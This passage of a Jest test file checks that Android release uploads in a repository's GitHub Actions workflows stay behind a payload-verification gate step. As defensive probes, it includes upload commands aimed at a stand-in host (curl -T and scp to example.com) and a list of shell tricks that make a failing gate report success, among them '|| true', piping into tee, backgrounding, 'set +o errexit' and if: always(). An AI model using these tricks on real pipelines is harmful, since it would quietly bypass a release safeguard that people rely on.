    digest: '0e127c3ea33a',
  },
  './.github/actions/setup-ccache': {
    reason: 'restores the compiler cache',
    assert: compositeShipsNothing,
    digest: '46922326eb0c',
  },
};

/** The only two entries that may stand on `carriedBy`; a third costs a review. */
const CARRIED_BY_THE_RULES = [
  'actions/upload-artifact@v4',
  'softprops/action-gh-release@v1',
];

const APK_PATH =
  'android/app/build/outputs/apk/prod/release/app-prod-release.apk';

/**
 * One step that every exemption assertion must reject: it names the APK, sends
 * it somewhere, pushes a tag, and sits in a building job with no gate after it.
 */
const PROBE_STEP = {
  workflow: 'probe.yml',
  job: 'probe',
  index: 1,
  name: 'Ship the APK',
  run: `git push origin "v1.0.0"\ncurl -T ${APK_PATH} https://example.com/`,
  uses: '',
  with: {path: APK_PATH},
  raw: {},
};

const PROBE_JOB = {
  workflow: 'probe.yml',
  id: 'probe',
  steps: [
    {
      workflow: 'probe.yml',
      job: 'probe',
      index: 0,
      name: 'Build it',
      run: './gradlew assembleProdRelease',
      uses: '',
      with: {},
      raw: {},
    },
    PROBE_STEP,
  ],
};

/**
 * The same step in a job that satisfies **every job-level predicate**: it
 * builds nothing, and it has a gate step below the probe. Any assertion still
 * returning true here is deciding on the job and ignoring the step it was
 * handed — which the building-job probe above cannot reveal, because there the
 * job half is false and the assertion never has to look at the step at all.
 */
const PROBE_JOB_WITHOUT_EXCUSES = {
  workflow: 'probe.yml',
  id: 'probe',
  steps: [
    PROBE_STEP,
    {
      workflow: 'probe.yml',
      job: 'probe',
      index: 2,
      name: 'Verify the Android payload',
      run: `node scripts/verify-android-payload.js --apk ${APK_PATH}`,
      uses: '',
      with: {},
      raw: {},
    },
  ],
};

// -- the rules -------------------------------------------------------------

function accountedEntriesFor(step) {
  return ACCOUNTED_STEPS.filter(
    entry =>
      entry.workflow === step.workflow &&
      entry.job === step.job &&
      entry.step === step.name,
  );
}

/** Ordering: every publishing step sits above a gate step in its own job. */
function violationsOfOrdering(m) {
  const problems = [];
  for (const job of allJobs(m)) {
    if (!isBuildingJob(job, m.lanes)) {
      continue;
    }
    const gates = job.steps.filter(isGateStep);
    for (const step of job.steps) {
      if (!publisherOf(step, m.lanes)) {
        continue;
      }
      if (!gates.some(gate => gate.index < step.index)) {
        problems.push(
          `${where(step)} publishes at step ${step.index} with no gate step below it`,
        );
      }
    }
  }
  return problems;
}

/**
 * The publisher classes that must name what they ship. A tag push genuinely
 * names no artifact; the other four cannot publish without one, so resolving
 * to nothing means the parse could not read what they send — never that they
 * send nothing.
 */
const MUST_NAME_AN_ARTIFACT = new Set([
  'workflow-artifact',
  'github-release',
  'play-upload',
  'gh-release-cli',
]);

/**
 * Path identity: the gate below a publishing step examined the bytes it publishes, and
 * nothing between the two named that artifact again. Ordering alone binds the
 * gate to nothing: gating the APK while publishing the bundle is ordered and
 * examines neither.
 */
function violationsOfPathIdentity(m) {
  const problems = [];
  for (const job of allJobs(m)) {
    const gates = job.steps.filter(isGateStep);
    for (const step of job.steps) {
      const publisher = publisherOf(step, m.lanes);
      if (!publisher) {
        continue;
      }
      for (const concern of publisher.concerns) {
        problems.push(
          concern.kind === 'unreadable'
            ? `${where(step)} publishes ${concern.token}, which this parse cannot resolve to a filename, so no gate step can be shown to have examined it`
            : `${where(step)} publishes ${concern.token}, which is neither an Android artifact this parse can compare nor a declared non-artifact upload`,
        );
      }
      // An empty resolution is the failure this rule exists to prevent, so it
      // cannot be the shape a satisfied one takes.
      if (
        publisher.paths.length === 0 &&
        publisher.concerns.length === 0 &&
        publisher.declared === 0 &&
        publisher.rules.some(rule => MUST_NAME_AN_ARTIFACT.has(rule))
      ) {
        problems.push(
          `${where(step)} publishes, but this parse could not read any path out of it, so no gate step can be shown to have examined what it sends`,
        );
      }
      for (const artifact of publisher.paths) {
        const gate = gates
          .filter(
            candidate =>
              candidate.index < step.index &&
              gateExamines(candidate).includes(artifact),
          )
          .pop();
        if (!gate) {
          problems.push(
            `${where(step)} publishes ${artifact}, which no gate step below it examined`,
          );
          continue;
        }
        const interposed = job.steps.find(
          other =>
            other.index > gate.index &&
            other.index < step.index &&
            stepText(other, m.lanes).includes(artifact),
        );
        if (interposed) {
          problems.push(
            `${where(interposed)} names ${artifact} after the gate examined it and before ${where(step)} publishes it`,
          );
        }
      }
    }
  }
  return problems;
}

/** `if: always()` and friends run a step whatever the gate decided. */
const RUNS_REGARDLESS =
  /always\s*\(\s*\)|failure\s*\(\s*\)|cancelled\s*\(\s*\)/i;

/**
 * The gate can still fail the job, and a failed gate still stops the publish.
 *
 * Both halves, because they are the same evasion from opposite ends. A skipped,
 * suppressed or piped gate keeps ordering and path identity green while
 * asserting nothing — the default shell is `bash -e {0}`, which sets no
 * pipefail, so a trailing `| tee` exits with tee's status. And a publishing
 * step carrying `if: always()` runs on a build the gate has just refused,
 * while its position in the job is still perfectly correct. `if: always()`
 * already appears seven lines above each of two uploads, so it is the
 * idiomatic thing to write there.
 */
function violationsOfGateCanFail(m) {
  const problems = [];

  for (const job of allJobs(m)) {
    if (!job.steps.some(isGateStep)) {
      continue;
    }
    for (const step of job.steps) {
      const publisher = publisherOf(step, m.lanes);
      // A report upload ships evidence about the artifact rather than the
      // artifact. A tag push names no file and is still a publish.
      const shipsOnlyDeclaredFiles =
        publisher &&
        publisher.declared > 0 &&
        publisher.paths.length === 0 &&
        publisher.concerns.length === 0 &&
        !publisher.rules.includes('tag-push');
      if (
        publisher &&
        !shipsOnlyDeclaredFiles &&
        RUNS_REGARDLESS.test(String(step.raw.if ?? ''))
      ) {
        problems.push(
          `${where(step)} publishes under if: ${step.raw.if}, so it runs even when the gate failed`,
        );
      }
    }
  }

  for (const step of allSteps(m)) {
    if (!isGateStep(step)) {
      continue;
    }
    const complain = why => problems.push(`${where(step)} ${why}`);
    if (step.raw.if !== undefined) {
      complain('carries an if:, so it can be skipped');
    }
    if (step.raw['continue-on-error'] !== undefined) {
      complain('carries continue-on-error');
    }
    // The script is only one of the keys that decide what runs. `env` can
    // preload a module, `working-directory` can move the paths the flags name,
    // and a `container` would replace the machine.
    const permittedKeys = ['name', 'run'];
    const extra = Object.keys(step.raw).filter(
      key => !permittedKeys.includes(key),
    );
    if (extra.length > 0) {
      complain(`carries ${extra.join(', ')}, which the gate step may not set`);
    }

    // The shape is pinned, rather than a list of ways to defeat it. Every way
    // `bash -e` can be made to report success for a failing command is a shell
    // feature — `||`, a pipe, `&`, `!`, `if`/`while`, `set +e` in its several
    // spellings, `trap … ERR`, another command after it on the same line — and
    // enumerating them is a blacklist over the shell. What the gate step is
    // allowed to be is one command, optionally after `set -euo pipefail`, and
    // that is a list of two.
    const commands = step.run
      .replace(/\\\n\s*/g, ' ')
      .split('\n')
      .map(line => line.trim())
      .filter(Boolean);
    const invocation =
      /^node\s+\S*verify-android-payload\.js(\s+--[\w-]+(\s+\S+)?)*$/;
    const permitted =
      (commands.length === 1 && invocation.test(commands[0])) ||
      (commands.length === 2 &&
        commands[0] === 'set -euo pipefail' &&
        invocation.test(commands[1]));
    if (!permitted) {
      complain(
        'does not run the payload check as its whole script; the only permitted shape is the invocation, optionally after `set -euo pipefail`',
      );
    }
    if (step.run.includes('--manifest')) {
      complain('passes --manifest, which is a test flag');
    }
  }
  return problems;
}

/** A publishing step outside a building job must obtain no build output. */
function violationsOfCrossJobPublish(m) {
  const problems = [];
  for (const job of allJobs(m)) {
    if (isBuildingJob(job, m.lanes)) {
      continue;
    }
    const publishers = job.steps.filter(step => publisherOf(step, m.lanes));
    const source = job.steps.find(obtainsAndroidOutput);
    if (publishers.length > 0 && source) {
      problems.push(
        `${where(publishers[0])} publishes in a job that builds nothing but obtains output at ${where(source)}`,
      );
    }
  }
  return problems;
}

/** No lane both builds and publishes; the split is invisible to the workflow graph. */
function violationsOfLaneSplit(m) {
  return m.lanes
    .filter(lane => buildsAndroid(lane.body) && publishesAndroid(lane.body))
    .map(lane => `${lane.origin} lane ${lane.name} both builds and publishes`);
}

/**
 * Inside a building job, every step is accounted for or it is a violation.
 *
 * This is the inversion. The other rules ask "does this step publish?", which
 * is a question about an open set — free-form shell, arbitrary actions, any
 * spelling of a path — and each round of review found another spelling it
 * answered wrongly. This one asks "is this step one of the ones we know
 * about?", which is a question about a closed set: the steps committed to this
 * repository. An unrecognised step is refused rather than skipped, so a new way
 * to publish does not have to be recognised in order to be caught.
 */
function violationsOfUnaccountedSteps(m) {
  const problems = [];
  for (const job of allJobs(m)) {
    if (!isBuildingJob(job, m.lanes)) {
      continue;
    }
    const container = ACCOUNTED_JOBS[`${job.workflow}/${job.id}`];
    if (!container) {
      problems.push(
        `${job.workflow} ${job.id} builds Android and its job and workflow keys are not accounted for`,
      );
    } else if (jobDigestOf(job) !== container) {
      problems.push(
        `${job.workflow} ${job.id} has changed around its steps since it was reviewed (container ${jobDigestOf(job)}, accounted as ${container})`,
      );
    }
    for (const step of job.steps) {
      const entries = accountedEntriesFor(step);
      if (entries.length === 0) {
        problems.push(
          `${where(step)} is in a job that builds Android and is not accounted for`,
        );
        continue;
      }
      // Ambiguity in either direction leaves a step answered by an entry that
      // was not written for it: two entries claiming one step, or one entry
      // covering two steps that need not have the same content.
      const twins = job.steps.filter(other => other.name === step.name);
      if (entries.length > 1 || twins.length > 1) {
        problems.push(
          `${where(step)} is matched by ${entries.length} entries and shares its name with ${twins.length} steps, so which one answers for it is undecided`,
        );
        continue;
      }
      const entry = entries[0];
      // The list of steps is closed; this closes what a step contains. Without
      // it a step keeps its exemption through any edit to its own body, and
      // every assertion beside it is an enumeration of the transports somebody
      // thought of.
      const digest = digestOf(step);
      if (digest !== entry.digest) {
        problems.push(
          `${where(step)} has changed since it was reviewed (content ${digest}, accounted as ${entry.digest})`,
        );
      }
      if (entry.assert && !entry.assert(step, job, m)) {
        problems.push(
          `${where(step)} no longer satisfies the reason it is accounted for: ${entry.reason}`,
        );
      }
    }
  }
  return problems;
}

/** Anything that looks like it could ship bytes is classified or exempt. */
function violationsOfSuspicionNet(m) {
  const building = new Set(
    allJobs(m)
      .filter(job => isBuildingJob(job, m.lanes))
      .map(job => `${job.workflow}/${job.id}`),
  );
  return allSteps(m)
    .filter(step => {
      // Building jobs are covered by the stronger rule above, which accounts
      // for every step rather than only the ones a pattern notices.
      if (building.has(`${step.workflow}/${step.job}`)) {
        return false;
      }
      if (publisherOf(step, m.lanes) || accountedEntriesFor(step).length > 0) {
        return false;
      }
      return step.uses
        ? !ALLOWED_ACTIONS[step.uses]
        : SUSPICIOUS_RUN.test(step.run);
    })
    .map(step => `${where(step)} is neither classified nor exempt`);
}

// -- the committed files ---------------------------------------------------

const committed = model();

describe('the parse itself', () => {
  // Without these, a parse that matched nothing would make every rule below
  // pass vacuously and CI would stay green.
  it('parses every workflow into jobs with steps, exempting none', () => {
    const globbed = fs
      .readdirSync(WORKFLOW_DIR)
      .filter(name => /\.ya?ml$/.test(name))
      .sort();
    expect(committed.workflows.map(workflow => workflow.file)).toEqual(globbed);
    expect(globbed).toEqual(expect.arrayContaining(KNOWN_WORKFLOWS));
    for (const workflow of committed.workflows) {
      expect(workflow.jobs.length).toBeGreaterThan(0);
      for (const job of workflow.jobs) {
        expect(job.steps.length).toBeGreaterThan(0);
      }
    }
  });

  it('finds exactly the three Android building jobs, each gated', () => {
    const building = allJobs(committed)
      .filter(job => isBuildingJob(job, committed.lanes))
      .map(job => `${job.workflow}/${job.id}`);

    // A legitimate new Android build job costs a reviewed edit to this list.
    expect(building.sort()).toEqual([
      'ci.yml/build-android',
      'e2e-tests.yml/build-android',
      'release.yml/build_android',
    ]);
    for (const job of allJobs(committed)) {
      if (isBuildingJob(job, committed.lanes)) {
        expect(job.steps.filter(isGateStep).length).toBeGreaterThan(0);
      }
    }
  });

  it('classifies the three release publishing steps by name', () => {
    const steps = Object.fromEntries(
      allSteps(committed)
        .filter(step => step.workflow === 'release.yml')
        .map(step => [step.name, publisherOf(step, committed.lanes)]),
    );

    expect(steps['Upload Android app to Alpha track'].rules).toEqual([
      'play-upload',
    ]);
    expect(steps['Push the release tag'].rules).toEqual(['tag-push']);
    expect(steps['Create GitHub Release'].rules).toEqual(['github-release']);

    // Two of the three resolve to a path the identity rule can compare; a
    // tag names no artifact, so that rule is properly vacuous for it.
    expect(steps['Upload Android app to Alpha track'].paths).toEqual([
      'app-prod-release.aab',
    ]);
    expect(steps['Create GitHub Release'].paths).toEqual([
      'app-prod-release.apk',
    ]);
    expect(steps['Push the release tag'].paths).toEqual([]);
  });

  it('leaves no exemption unmatched, on either surface', () => {
    const suspicious = allSteps(committed).filter(step =>
      step.uses ? true : SUSPICIOUS_RUN.test(step.run),
    );
    expect(suspicious.length).toBeGreaterThan(0);

    for (const entry of ACCOUNTED_STEPS) {
      const matched = allSteps(committed).filter(
        step =>
          step.workflow === entry.workflow &&
          step.job === entry.job &&
          step.name === entry.step,
      );
      expect({entry: entry.step, matched: matched.length}).toEqual({
        entry: entry.step,
        matched: 1,
      });
      // Exactly one of the two floors: an assertion that can fail, or a stated
      // reason it is carried elsewhere. Never neither.
      expect({
        entry: entry.step,
        floored: Boolean(entry.assert || entry.digest),
      }).toEqual({entry: entry.step, floored: true});
      if (entry.assert) {
        expect({
          entry: entry.step,
          holds: entry.assert(matched[0], jobOf(matched[0]), committed),
        }).toEqual({entry: entry.step, holds: true});
      }
    }

    const used = new Set(
      allSteps(committed)
        .map(step => step.uses)
        .filter(Boolean),
    );
    expect([...used].sort()).toEqual(Object.keys(ALLOWED_ACTIONS).sort());
    for (const [action, entry] of Object.entries(ALLOWED_ACTIONS)) {
      const steps = allSteps(committed).filter(step => step.uses === action);
      expect({action, count: steps.length > 0}).toEqual({action, count: true});
      if (entry.digest) {
        expect({action, content: compositeDigest(action)}).toEqual({
          action,
          content: entry.digest,
        });
      }
      // Exactly one of the two floors, never neither and never both.
      expect({
        action,
        floored: Boolean(entry.assert) !== Boolean(entry.carriedBy),
      }).toEqual({
        action,
        floored: true,
      });
      for (const step of steps) {
        if (!entry.assert) {
          continue;
        }
        expect({
          action,
          holds: entry.assert(step, jobOf(step), committed),
        }).toEqual({action, holds: true});
      }
    }

    expect(
      Object.entries(ALLOWED_ACTIONS)
        .filter(([, entry]) => entry.carriedBy)
        .map(([action]) => action)
        .sort(),
    ).toEqual([...CARRIED_BY_THE_RULES].sort());
  });

  /**
   * An assertion that no input can falsify is not a check, and the easiest one
   * to write by accident restates its own lookup key or reads only the job.
   *
   * Two probe jobs, because one is not enough: an assertion deciding purely on
   * the job is falsified by the building-job probe without ever looking at the
   * step it was handed. The second job satisfies every job-level predicate —
   * builds nothing, gate below the step — so only the step half can carry it
   * there. Add a probe whenever an exemption learns to read something new.
   */
  it.each([
    ['a building job with no gate', () => PROBE_JOB],
    ['a job with every excuse removed', () => PROBE_JOB_WITHOUT_EXCUSES],
  ])('rests no exemption on an assertion that cannot fail, in %s', (_l, of) => {
    const job = of();
    for (const entry of ACCOUNTED_STEPS) {
      if (!entry.assert) {
        continue;
      }
      expect({
        entry: `${entry.workflow} ${entry.step}`,
        survivesTheProbe: entry.assert(PROBE_STEP, job, committed),
      }).toEqual({
        entry: `${entry.workflow} ${entry.step}`,
        survivesTheProbe: false,
      });
    }

    for (const [action, entry] of Object.entries(ALLOWED_ACTIONS)) {
      // The composites read their own action.yml rather than the step, so the
      // step-shaped probe says nothing about them; they are probed below.
      if (!entry.assert || COMPOSITE_ACTIONS[action]) {
        continue;
      }
      expect({
        action,
        survivesTheProbe: entry.assert(PROBE_STEP, job, committed),
      }).toEqual({action, survivesTheProbe: false});
    }
  });

  it('refuses a composite action that grew a way to ship bytes', () => {
    const composite = command =>
      [
        'name: probe',
        'runs:',
        '  using: composite',
        '  steps:',
        `    - run: ${command}`,
        '      shell: bash',
      ].join('\n');

    expect(shipsNothing(composite('echo hello'))).toBe(true);
    expect(shipsNothing(composite('gh release upload v1 a.apk'))).toBe(false);
    expect(shipsNothing(composite('curl -T a.apk https://example.com/'))).toBe(
      false,
    );
    expect(shipsNothing(composite('scp a.aab example.com:/srv/'))).toBe(false);
  });

  // Asserted rather than described: a count in a comment is a claim nothing
  // checks.
  it('accounts for every step of every building job, by role', () => {
    const steps = allJobs(committed)
      .filter(job => isBuildingJob(job, committed.lanes))
      .flatMap(job => job.steps);
    const role = step =>
      isGateStep(step)
        ? 'gate'
        : publisherOf(step, committed.lanes)
          ? 'publisher'
          : step.uses
            ? 'action'
            : 'run';
    const census = steps.reduce((out, step) => {
      out[role(step)] = (out[role(step)] ?? 0) + 1;
      return out;
    }, {});

    expect(census).toEqual({gate: 3, publisher: 8, action: 17, run: 27});
    expect(steps).toHaveLength(55);
    expect(ACCOUNTED_STEPS).toHaveLength(58);
    expect(ACCOUNTED_STEPS.filter(entry => entry.digest === null)).toHaveLength(
      3,
    );
    expect(Object.keys(ALLOWED_ACTIONS)).toHaveLength(14);
  });

  it('pins every Fastfile by content, and the declared uploads reach no build output', () => {
    expect(fastfileDigest()).toEqual(ACCOUNTED_FASTFILES);
    for (const declared of NON_ARTIFACT_UPLOADS) {
      expect(declared).not.toContain('build/outputs');
    }
  });

  it('resolves every accounted row to an assertion that exists', () => {
    // A mistyped key yields `undefined`, and an entry with no assertion is a
    // row that floors nothing.
    for (const entry of ACCOUNTED_STEPS) {
      expect({
        entry: `${entry.workflow} ${entry.step}`,
        resolved: entry.assert !== undefined || entry.digest !== null,
      }).toEqual({entry: `${entry.workflow} ${entry.step}`, resolved: true});
    }
  });

  it('reads the two Android fastlane lanes and what each one does', () => {
    const android = committed.lanes.filter(lane => lane.origin === 'android');
    expect(android.map(lane => lane.name)).toEqual([
      'build_android_release',
      'upload_android_alpha',
    ]);

    const [build, upload] = android;
    expect(buildsAndroid(build.body)).toBe(true);
    expect(publishesAndroid(build.body)).toBe(false);
    expect(publishesAndroid(upload.body)).toBe(true);
    expect(artifactsIn(upload.body)).toEqual(['app-prod-release.aab']);
  });
});

function jobOf(step) {
  return allJobs(committed).find(
    job => job.workflow === step.workflow && job.id === step.job,
  );
}

describe('no publish outruns the payload gate', () => {
  it.each([
    ['ordering', violationsOfOrdering],
    ['path identity', violationsOfPathIdentity],
    ['the gate can fail', violationsOfGateCanFail],
    ['cross-job publishing', violationsOfCrossJobPublish],
    ['the lane split', violationsOfLaneSplit],
    ['the suspicion net', violationsOfSuspicionNet],
    ['every step accounted for', violationsOfUnaccountedSteps],
  ])('%s holds over the committed workflows', (_label, rule) => {
    expect(rule(committed)).toEqual([]);
  });
});

/**
 * Each rule is applied to a deliberately broken in-memory copy. The committed
 * files are never touched: a rule that has only ever been seen passing is not
 * known to be capable of failing, which is how a fail-closed assertion becomes
 * decorative.
 */
describe('each rule is capable of failing', () => {
  const broken = () => model();

  /**
   * A synthesised step has to arrive the way a parsed one does. `parseWorkflows`
   * runs every `run:` through `codeOf`, so a mutation that sets one directly is
   * exercising text the real parse would never have produced — and a case built
   * that way can pass while the reader it is meant to test does nothing.
   */
  const asParsed = fields => ({...fields, run: codeOf(fields.run ?? '')});
  const appendRun = (step, extra) => {
    step.run = codeOf(`${step.run}\n${extra}`);
  };

  const stepIn = (m, workflow, job, name) => {
    const found = allJobs(m)
      .find(
        candidate => candidate.workflow === workflow && candidate.id === job,
      )
      .steps.find(step => step.name === name);
    expect(found).toBeDefined();
    return found;
  };

  const jobIn = (m, workflow, job) =>
    allJobs(m).find(
      candidate => candidate.workflow === workflow && candidate.id === job,
    );

  const reindex = job =>
    job.steps.forEach((step, index) => (step.index = index));

  it('ordering fails when a publishing step is moved above the gate', () => {
    const m = broken();
    const job = jobIn(m, 'release.yml', 'build_android');
    const gate = job.steps.findIndex(isGateStep);
    const upload = job.steps.findIndex(
      step => step.name === 'Upload Android app to Alpha track',
    );
    job.steps.splice(gate, 0, job.steps.splice(upload, 1)[0]);
    reindex(job);

    expect(violationsOfOrdering(m)).toEqual([
      expect.stringContaining('Upload Android app to Alpha track'),
    ]);
  });

  it('path identity fails when a publisher ships bytes no gate step examined', () => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-android');
    // The gate here passes --apk only, so a bundle built and uploaded beside
    // it is ordered after a gate that never opened it.
    job.steps.push(
      asParsed({
        workflow: 'ci.yml',
        job: 'build-android',
        index: job.steps.length,
        name: 'Upload the bundle to Play',
        run: 'bundle exec fastlane upload_android_alpha',
        uses: '',
        with: {},
        raw: {},
      }),
    );

    expect(violationsOfOrdering(m)).toEqual([]);
    expect(violationsOfPathIdentity(m)).toEqual([
      expect.stringContaining('app-prod-release.aab'),
    ]);
  });

  it('path identity fails when a step rewrites the artifact after the gate read it', () => {
    const m = broken();
    const job = jobIn(m, 'release.yml', 'build_android');
    const gate = job.steps.findIndex(isGateStep);
    job.steps.splice(
      gate + 1,
      0,
      asParsed({
        workflow: 'release.yml',
        job: 'build_android',
        index: 0,
        name: 'Re-sign the APK',
        run: 'apksigner sign android/app/build/outputs/apk/prod/release/app-prod-release.apk',
        uses: '',
        with: {},
        raw: {},
      }),
    );
    reindex(job);

    expect(violationsOfOrdering(m)).toEqual([]);
    expect(violationsOfPathIdentity(m)).toEqual([
      expect.stringContaining('Re-sign the APK'),
    ]);
  });

  it.each([
    ['a skipping if:', step => (step.raw.if = false)],
    ['continue-on-error', step => (step.raw['continue-on-error'] = true)],
    ['a || fallback', step => (step.run = `${step.run.trim()} || true`)],
    [
      'a pipe into tee',
      step => (step.run = `${step.run.trim()} 2>&1 | tee gate.log`),
    ],
    ['a trailing unrelated command', step => appendRun(step, 'echo done')],
    ['a test manifest', step => (step.run += ' --manifest /tmp/weak.json')],
  ])(
    'the gate-can-fail rule catches a gate neutered by %s',
    (_label, neuter) => {
      const m = broken();
      neuter(
        stepIn(m, 'ci.yml', 'build-android', 'Verify the Android payload'),
      );

      expect(violationsOfOrdering(m)).toEqual([]);
      expect(violationsOfGateCanFail(m).length).toBeGreaterThan(0);
    },
  );

  it('the cross-job rule fails when a job downloads the build output and publishes it', () => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-and-test');
    job.steps.push(
      {
        workflow: 'ci.yml',
        job: 'build-and-test',
        index: job.steps.length,
        name: 'Download the APK',
        run: '',
        uses: 'actions/download-artifact@v4',
        with: {name: 'android-release-apk'},
        raw: {},
      },
      {
        workflow: 'ci.yml',
        job: 'build-and-test',
        index: job.steps.length + 1,
        name: 'Publish it',
        run: 'gh release upload v1.0.0 app-prod-release.apk',
        uses: '',
        with: {},
        raw: {},
      },
    );

    expect(violationsOfCrossJobPublish(m)).toEqual([
      expect.stringContaining('Publish it'),
    ]);
  });

  /**
   * The two allowlist entries carrying no assertion of their own claim the
   * ordering rules hold them. Checked here rather than asserted, and across
   * every spelling of a path — a rule keyed on literal filenames holds only
   * for the spelling it can read, and a glob, a bare directory or an
   * expression reaches the same bytes while matching none of them.
   */
  // Every spelling twice: alone, and paired with the very filename the gate
  // above it did examine. The pairing is the one that matters — a rule that
  // stops at the first name it recognises reports the pair as fully gated.
  const GATED_APK =
    'android/app/build/outputs/apk/prod/release/app-prod-release.apk';
  const SPELLINGS = [
    [
      'an explicit filename',
      'android/app/build/outputs/bundle/prodRelease/app-prod-release.aab',
      'app-prod-release.aab',
    ],
    [
      'a glob',
      'android/app/build/outputs/**/*.aab',
      'cannot resolve to a filename',
    ],
    [
      'a bare directory',
      'android/app/build/outputs/apk/prod/release/',
      'cannot resolve to a filename',
    ],
    ['an expression', '${{ env.APK_PATH }}', 'cannot resolve to a filename'],
    // Outside build/outputs entirely: a staging directory names no artifact a
    // filename rule can see, and keying on the Gradle path would miss it.
    ['a staging directory', 'dist/', 'cannot resolve to a filename'],
    ['an artifacts directory', 'artifacts/', 'cannot resolve to a filename'],
    [
      'a release directory',
      'android/app/release/',
      'cannot resolve to a filename',
    ],
  ].flatMap(([spelling, value, fragment]) => [
    [spelling, value, fragment],
    [`${spelling} beside a gated filename`, `${GATED_APK}\n${value}`, fragment],
  ]);

  it.each(
    SPELLINGS.flatMap(([spelling, value, fragment]) => [
      [
        `actions/upload-artifact@v4 with ${spelling}`,
        {uses: 'actions/upload-artifact@v4', with: {name: 'out', path: value}},
        fragment,
      ],
      [
        `softprops/action-gh-release@v1 with ${spelling}`,
        {uses: 'softprops/action-gh-release@v1', with: {files: value}},
        fragment,
      ],
    ]),
  )('path identity catches %s', (_label, step, fragment) => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-android');
    job.steps.push(
      asParsed({
        ...step,
        workflow: 'ci.yml',
        job: 'build-android',
        index: job.steps.length,
        name: 'Ship the build output',
        run: '',
        raw: {},
      }),
    );

    expect(violationsOfOrdering(m)).toEqual([]);
    expect(violationsOfPathIdentity(m)).toContainEqual(
      expect.stringContaining(fragment),
    );
  });

  // The command-line publishers name their paths as arguments rather than in a
  // `with:` block, and the same spellings hide an artifact there. Both rules
  // must fire: ordering decides on position alone, so it says nothing about
  // whether the gate could compare what is published.
  it.each([
    ['gh release create', 'gh release create v1.0.0 dist/*.apk'],
    [
      'a fastlane play upload',
      'bundle exec fastlane run upload_to_play_store aab:android/app/build/outputs/bundle/prodRelease/',
    ],
  ])('both rules catch %s naming no resolvable file', (_label, run) => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-android');
    const gate = job.steps.findIndex(isGateStep);
    job.steps.splice(
      gate,
      0,
      asParsed({
        workflow: 'ci.yml',
        job: 'build-android',
        index: 0,
        name: 'Publish the build output',
        run,
        uses: '',
        with: {},
        raw: {},
      }),
    );
    reindex(job);

    expect(violationsOfOrdering(m)).toEqual([
      expect.stringContaining('Publish the build output'),
    ]);
    expect(violationsOfPathIdentity(m)).toEqual([
      expect.stringContaining('cannot resolve to a filename'),
    ]);
  });

  it('both rules catch a directory-path upload spliced above the gate', () => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-android');
    const gate = job.steps.findIndex(isGateStep);
    job.steps.splice(
      gate,
      0,
      asParsed({
        workflow: 'ci.yml',
        job: 'build-android',
        index: 0,
        name: 'Upload the APK directory',
        run: '',
        uses: 'actions/upload-artifact@v4',
        with: {
          name: 'android-release-apk',
          path: 'android/app/build/outputs/apk/prod/release/',
        },
        raw: {},
      }),
    );
    reindex(job);

    expect(violationsOfOrdering(m)).toEqual([
      expect.stringContaining('Upload the APK directory'),
    ]);
    expect(violationsOfPathIdentity(m)).toEqual([
      expect.stringContaining('cannot resolve to a filename'),
    ]);
  });

  it('classifies a step that is two publishers at once, not just the first', () => {
    const m = broken();
    const step = stepIn(
      m,
      'release.yml',
      'build_android',
      'Upload Android app to Alpha track',
    );
    appendRun(
      step,
      'gh release upload "v$VERSION" android/app/build/outputs/apk/e2e/release/',
    );

    expect(publisherOf(step, m.lanes).rules).toEqual([
      'play-upload',
      'gh-release-cli',
    ]);
    expect(violationsOfPathIdentity(m)).toContainEqual(
      expect.stringContaining('cannot resolve to a filename'),
    );
  });

  /**
   * A publishing step carrying `if: always()` runs on a build the gate has
   * just refused, while sitting in exactly the right place in the job. Ordering
   * and path identity read position and paths; neither reads `if:`.
   */
  it.each([
    [
      'a workflow-artifact upload',
      {
        uses: 'actions/upload-artifact@v4',
        with: {name: 'apk', path: GATED_APK},
      },
    ],
    [
      'a GitHub Release',
      {uses: 'softprops/action-gh-release@v1', with: {files: GATED_APK}},
    ],
    ['a Play upload', {run: 'bundle exec fastlane upload_android_alpha'}],
    ['a gh release upload', {run: `gh release upload v1.0.0 ${GATED_APK}`}],
    ['a tag push', {run: 'git push origin "v1.0.0"'}],
    // GitHub does not read the expression case-sensitively, so neither may this.
    [
      'an upload under a capitalised Always()',
      {
        uses: 'actions/upload-artifact@v4',
        with: {name: 'apk', path: GATED_APK},
        conditional: 'Always()',
      },
    ],
  ])(
    'the gate-can-fail rule catches %s running under if: always()',
    (_l, s) => {
      const m = broken();
      const job = jobIn(m, 'ci.yml', 'build-android');
      job.steps.push(
        asParsed({
          workflow: 'ci.yml',
          job: 'build-android',
          index: job.steps.length,
          name: 'Publish regardless',
          run: '',
          uses: '',
          with: {},
          ...s,
          raw: {if: s.conditional ?? 'always()'},
        }),
      );

      expect(violationsOfGateCanFail(m)).toEqual([
        expect.stringContaining('runs even when the gate failed'),
      ]);
    },
  );

  it('leaves an if: that cannot outrun a failed gate alone', () => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-android');
    job.steps.push(
      asParsed({
        workflow: 'ci.yml',
        job: 'build-android',
        index: job.steps.length,
        name: 'Publish on a branch',
        run: '',
        uses: 'actions/upload-artifact@v4',
        with: {name: 'apk', path: GATED_APK},
        raw: {if: "github.ref == 'refs/heads/main'"},
      }),
    );

    expect(violationsOfGateCanFail(m)).toEqual([]);
  });

  /**
   * `bash -e` reports no failure for a command it merely inspected, so each of
   * these exits 0 with the gate exiting non-zero. The multi-line `if` was
   * already caught, which is what made collapsing it onto one line the reward.
   */
  it.each([
    ['backgrounding', run => `${run.trim()} &`],
    ['negation', run => `! ${run.trim()}`],
    ['a single-line if', run => `if ${run.trim()}; then echo ok; fi`],
    ['a single-line while', run => `while ${run.trim()}; do break; done`],
    ['the long spelling of set +e', run => `set +o errexit\n${run.trim()}`],
  ])('the gate-can-fail rule catches %s', (_label, neuter) => {
    const m = broken();
    const gate = stepIn(
      m,
      'ci.yml',
      'build-android',
      'Verify the Android payload',
    );
    gate.run = codeOf(neuter(gate.run.replace(/\\\n\s*/g, ' ')));

    expect(violationsOfOrdering(m)).toEqual([]);
    expect(violationsOfGateCanFail(m).length).toBeGreaterThan(0);
  });

  /**
   * A `#` inside a quoted string is not a comment. Every consumer of this text
   * is an unanchored presence test, so a truncated line can only lose matches —
   * which always moves a step toward exempt.
   */
  it('does not lose the path that follows a quoted # on the same line', () => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-android');
